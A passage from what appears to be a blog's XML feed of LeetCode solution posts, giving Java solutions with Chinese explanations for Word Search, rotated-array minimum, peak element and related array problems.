class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &lt; K &amp;&amp; points2.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        	Point point = points2.poll();</span><br><span class="line">        	result[index][<span class="number">0</span>] = points[point.index][<span class="number">0</span>];</span><br><span class="line">        	result[index][<span class="number">1</span>] = points[point.index][<span class="number">1</span>];</span><br><span class="line">        	index++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>79. Word Search</title>
    <url>/2020/03/24/LeetCode/leetcode-000079.%20Word%20Search/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a 2D board and a word, find if the word exists in the grid.</p>
<p>The word can be constructed from letters of sequentially adjacent cell, where “adjacent” cells are those horizontally or vertically neighboring. The same letter cell may not be used more than once.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">board &#x3D;</span><br><span class="line">[</span><br><span class="line">  [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;E&#39;],</span><br><span class="line">  [&#39;S&#39;,&#39;F&#39;,&#39;C&#39;,&#39;S&#39;],</span><br><span class="line">  [&#39;A&#39;,&#39;D&#39;,&#39;E&#39;,&#39;E&#39;]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">Given word &#x3D; &quot;ABCCED&quot;, return true.</span><br><span class="line">Given word &#x3D; &quot;SEE&quot;, return true.</span><br><span class="line">Given word &#x3D; &quot;ABCB&quot;, return false.</span><br></pre></td></tr></table></figure>

<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h2><ul>
<li><code>board</code> and <code>word</code> consists only of lowercase and uppercase English letters.</li>
<li><code>1 &lt;= board.length &lt;= 200</code></li>
<li><code>1 &lt;= board[i].length &lt;= 200</code></li>
<li><code>1 &lt;= word.length &lt;= 10^3</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>深度优先遍历</p>
<p>分解为以下步骤：</p>
<ol>
<li>遍历board中的每个字符，找到搜索起始点-即和word字符串第一个相等的char</li>
<li>对每个起始点，进行dfs搜索</li>
<li>如果搜索的时候，发现index已经等于word的长度了，则表示已经找到匹配的字符串了，直接返回</li>
<li>如果列或者行越界了，小于0或者大于列长度或者大于行长度，又或者当前的字符串和word对应位置的字符串不一致，说明当前路径是不可行的，直接返回</li>
<li>把当前节点置为一个特殊字符，表示已经使用，不可再用第二次，继续从当前节点的上下左右位置开始搜索</li>
<li>把当前节点置为原字符，供下次搜索使用</li>
</ol>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">exist</span><span class="params">(<span class="keyword">char</span>[][] board, String word)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (board[i][j] == word.charAt(<span class="number">0</span>)) &#123;</span><br><span class="line">					<span class="keyword">if</span> (dfs(i, j, <span class="number">0</span>, board, word)) &#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> row, <span class="keyword">int</span> col, <span class="keyword">int</span> index, <span class="keyword">char</span>[][] board, String word)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (index == word.length()) &#123;</span><br><span class="line">			<span class="comment">// 当前所有的字符已经匹配上</span></span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (row &lt; <span class="number">0</span> || row &gt;= board.length || col &lt; <span class="number">0</span> || col &gt;= board[<span class="number">0</span>].length</span><br><span class="line">				|| board[row][col] != word.charAt(index)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">char</span> c = board[row][col];</span><br><span class="line">		board[row][col] = <span class="string">'#'</span>;</span><br><span class="line">		<span class="keyword">boolean</span> result = dfs(row + <span class="number">1</span>, col, index + <span class="number">1</span>, board, word) || dfs(row - <span class="number">1</span>, col, index + <span class="number">1</span>, board, word)</span><br><span class="line">				|| dfs(row, col + <span class="number">1</span>, index + <span class="number">1</span>, board, word) || dfs(row, col - <span class="number">1</span>, index + <span class="number">1</span>, board, word);</span><br><span class="line">		board[row][col] = c;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>153. Find Minimum in Rotated Sorted Array II</title>
    <url>/2020/03/24/LeetCode/leetcode-000154.-Find%20Minimum%20in%20Rotated%20Sorted%20Array%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p>
<p>(i.e.,  <code>[0,1,2,4,5,6,7]</code> might become  <code>[4,5,6,7,0,1,2]</code>).</p>
<p>Find the minimum element.</p>
<p>The array may contain duplicates.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [1,3,5]</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">Output: <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="Note："><a href="#Note：" class="headerlink" title="Note："></a>Note：</h2><ul>
<li>This is a follow up problem to <a href="https://leetcode.com/problems/find-minimum-in-rotated-sorted-array/description/" target="_blank" rel="noopener">Find Minimum in Rotated Sorted Array</a>.</li>
<li>Would allow duplicates affect the run-time complexity? How and why?</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：库函数"><a href="#解法一：库函数" class="headerlink" title="解法一：库函数"></a>解法一：库函数</h3><p>排序，取第一个即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">    	<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：遍历"><a href="#解法二：遍历" class="headerlink" title="解法二：遍历"></a>解法二：遍历</h3><p>循环遍历，取最小的一个即可。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (min &gt; num) &#123;</span><br><span class="line">        		min = num;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：找到最大值和最小值的交界"><a href="#解法三：找到最大值和最小值的交界" class="headerlink" title="解法三：找到最大值和最小值的交界"></a>解法三：找到最大值和最小值的交界</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (;i &lt; nums.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[i + <span class="number">1</span>] &lt; nums[i]) &#123;</span><br><span class="line">				<span class="keyword">return</span> nums[i + <span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (i == nums.length - <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四：二分查找"><a href="#解法四：二分查找" class="headerlink" title="解法四：二分查找"></a>解法四：二分查找</h3><p>这块就不能用题目153的二分查找了。要稍微变形以下。</p>
<p>之前在使用二分查找的时候定义了三个值，low，mid，high。对应的nums数组中数字的关系，总共有6种，A3！。</p>
<p>分别是：</p>
<ul>
<li>nums[low] &lt;= nums[mid] &lt;= nums[tail]</li>
<li>nums[mid] &lt;= nums[tail] &lt;= nums[low]</li>
<li>nums[tail] &lt;= nums[low] &lt;= nums[mid]</li>
</ul>
<p>根据题目规则，已排序数组旋转，以下三种是不可能的情况：</p>
<ul>
<li>nums[head] &lt;= nums[tail] &lt;= nums[mid]</li>
<li>nums[mid] &lt;= nums[head] &lt;= nums[tail]</li>
<li>nums[tail] &lt;= nums[mid] &lt;= nums[head]</li>
</ul>
<h4 id="JAVA-2"><a href="#JAVA-2" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> high = nums.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">			<span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">if</span> (low == mid || high == mid) &#123;</span><br><span class="line">				<span class="keyword">return</span> Math.min(nums[low], Math.min(nums[mid], nums[high]));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (nums[low] &lt;= nums[mid] &amp;&amp; nums[mid] &lt;= nums[high]) &#123;</span><br><span class="line">				<span class="comment">// 单调递增数列</span></span><br><span class="line">				<span class="comment">// 1,1,2,3,4,5,5</span></span><br><span class="line">				high--;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &lt;= nums[high] &amp;&amp; nums[high] &lt;= nums[low]) &#123;</span><br><span class="line">				<span class="comment">// 后半段递增</span></span><br><span class="line">				<span class="comment">// 3,3,1,1,2,2</span></span><br><span class="line">				high = mid;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[high] &lt;= nums[low] &amp;&amp; nums[low] &lt;= nums[mid]) &#123;</span><br><span class="line">				<span class="comment">// 前半段递增</span></span><br><span class="line">				<span class="comment">// 2,2,3,4,5,1</span></span><br><span class="line">				low = mid;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法五：递归"><a href="#解法五：递归" class="headerlink" title="解法五：递归"></a>解法五：递归</h3><h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> findMin(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[l];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span> (nums[mid] &lt; nums[r]) &#123;</span><br><span class="line">			<span class="comment">// 后半段递增，则最小值在mid上或者mid左边</span></span><br><span class="line">			<span class="keyword">return</span> findMin(nums, l, mid);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; nums[r]) &#123;</span><br><span class="line">			<span class="comment">// 前半段递增</span></span><br><span class="line">			<span class="keyword">return</span> findMin(nums, mid + <span class="number">1</span>, r);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">int</span> le = findMin(nums, l, mid);</span><br><span class="line">			<span class="keyword">int</span> ri = findMin(nums, mid + <span class="number">1</span>, r);</span><br><span class="line">			<span class="keyword">return</span> Math.min(le, ri);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>162. Find Peak Element</title>
    <url>/2020/03/24/LeetCode/leetcode-000162.%20Find%20Peak%20Element/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>峰值元素是指其值大于左右相邻值的元素。</p>
<p>给定一个输入数组 nums，其中 nums[i] ≠ nums[i+1]，找到峰值元素并返回其索引。</p>
<p>数组可能包含多个峰值，在这种情况下，返回任何一个峰值所在位置即可。</p>
<p>你可以假设 nums[-1] = nums[n] = -∞。</p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums &#x3D; [1,2,3,1]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: 3 is a peak element and your function should return the index number 2.</span><br></pre></td></tr></table></figure>

<h2 id="示例-2："><a href="#示例-2：" class="headerlink" title="示例 2："></a>示例 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br><span class="line">Output: <span class="number">1</span> or <span class="number">5</span> </span><br><span class="line">Explanation: Your function can <span class="keyword">return</span> either index number <span class="number">1</span> where the peak element is <span class="number">2</span>, or index number <span class="number">5</span> where the peak element is <span class="number">6</span>.</span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li>你的解法应该是 <em>O</em>(<em>logN</em>) 时间复杂度的。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>遍历一趟，遇到nums[i] &gt; nums[i + 1]就返回当前的i</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findPeakElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[i] &gt; nums[i + <span class="number">1</span>]) &#123;</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> nums.length - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>二分查找。</p>
<p>根据得到的中点位置mid，判断后续是在左半部分还是右半部分搜索。比如：</p>
<p>数组：1，2，3，4，5，4，5，6，7。假设 mid = 4, mid + 1 = 5. 此时mid刚好是第一个峰值，那么就可以继续在左半部分搜索。</p>
<p>数组：1，2，3，4，5，4，5，6，7。假设 mid=3，mid + 1 = 4. 此时还没到右半部分，说明要继续在右半部分搜索。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findPeakElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> search(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (begin == end) &#123;</span><br><span class="line">			<span class="keyword">return</span> begin;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> mid = (begin + end) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span> (nums[mid] &gt; nums[mid + <span class="number">1</span>]) &#123;</span><br><span class="line">			<span class="keyword">return</span> search(nums, <span class="number">0</span>, mid);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> search(nums, mid + <span class="number">1</span>, end);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>153. Find Minimum in Rotated Sorted Array</title>
    <url>/2020/03/24/LeetCode/leetcode-000153.-Find%20Minimum%20in%20Rotated%20Sorted%20Array/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p>
<p>(i.e.,  <code>[0,1,2,4,5,6,7]</code> might become  <code>[4,5,6,7,0,1,2]</code>).</p>
<p>Find the minimum element.</p>
<p>You may assume no duplicate exists in the array.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [3,4,5,1,2] </span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">Output: <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：库函数"><a href="#解法一：库函数" class="headerlink" title="解法一：库函数"></a>解法一：库函数</h3><p>排序，取第一个即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">    	<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：遍历"><a href="#解法二：遍历" class="headerlink" title="解法二：遍历"></a>解法二：遍历</h3><p>循环遍历，取最小的一个即可。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (min &gt; num) &#123;</span><br><span class="line">        		min = num;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：二分查找"><a href="#解法三：二分查找" class="headerlink" title="解法三：二分查找"></a>解法三：二分查找</h3><h4 id="JAVA-2"><a href="#JAVA-2" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> high = nums.length - <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (nums[low] &lt; nums[high]) &#123;</span><br><span class="line">        	<span class="keyword">return</span> nums[low];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        	<span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">        	<span class="keyword">if</span> (nums[mid] &lt; nums[high]) &#123;</span><br><span class="line">        		<span class="comment">// mid 到 high 是递增的，说明最小元素在mid左侧，或者就是mid</span></span><br><span class="line">        		high = mid;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		low = mid + <span class="number">1</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> nums[low];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四：二分查找-递归"><a href="#解法四：二分查找-递归" class="headerlink" title="解法四：二分查找-递归"></a>解法四：二分查找-递归</h3><h4 id="JAVA-3"><a href="#JAVA-3" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> findMin(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (low == high) &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[low];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span> (nums[mid] &lt; nums[high]) &#123;</span><br><span class="line">			<span class="comment">// mid 到 high 是递增的，说明最小元素在mid左侧，或者就是mid</span></span><br><span class="line">			<span class="keyword">return</span> findMin(nums, low, mid);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> findMin(nums, mid + <span class="number">1</span>, high);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法五：二分查找变形"><a href="#解法五：二分查找变形" class="headerlink" title="解法五：二分查找变形"></a>解法五：二分查找变形</h3><p>通过二分查找的方法，找到这个数列的最大值。</p>
<p>因为这个数列是一个排序数列变形而来，那么紧跟在最大数字之后的数字，一定是最小的数字。</p>
<p>因此，求出最大数字的索引，加1返回即可。</p>
<p>注意一下，如果最大数字索引是数组长度-1的话，返回第一个元素的索引即可。</p>
<h4 id="JAVA-4"><a href="#JAVA-4" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> n = nums.length;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> b = n / <span class="number">2</span>; b &gt;= <span class="number">1</span>; b /= <span class="number">2</span>) &#123;</span><br><span class="line">			<span class="keyword">while</span> (index + b &lt; n &amp;&amp; nums[index + b] &gt; nums[index]) &#123;</span><br><span class="line">				index += b;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (index == nums.length - <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[index + <span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法六：分治法"><a href="#解法六：分治法" class="headerlink" title="解法六：分治法"></a>解法六：分治法</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> findMin(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// One or two elements</span></span><br><span class="line">		<span class="keyword">if</span> (left + <span class="number">1</span> &gt;= right)</span><br><span class="line">			<span class="keyword">return</span> Math.min(nums[left], nums[right]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Sorted</span></span><br><span class="line">		<span class="keyword">if</span> (nums[left] &lt; nums[right])</span><br><span class="line">			<span class="keyword">return</span> nums[left];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// to find the solution recursively</span></span><br><span class="line">		<span class="keyword">return</span> Math.min(findMin(nums, left, mid - <span class="number">1</span>), findMin(nums, mid, right));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>152. Maximum Product Subarray</title>
    <url>/2020/03/24/LeetCode/leetcode-000152.-Maximum-Product-Subarray/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given an integer array <code>nums</code>, find the contiguous subarray within an array (containing at least one number) which has the largest product.</p>
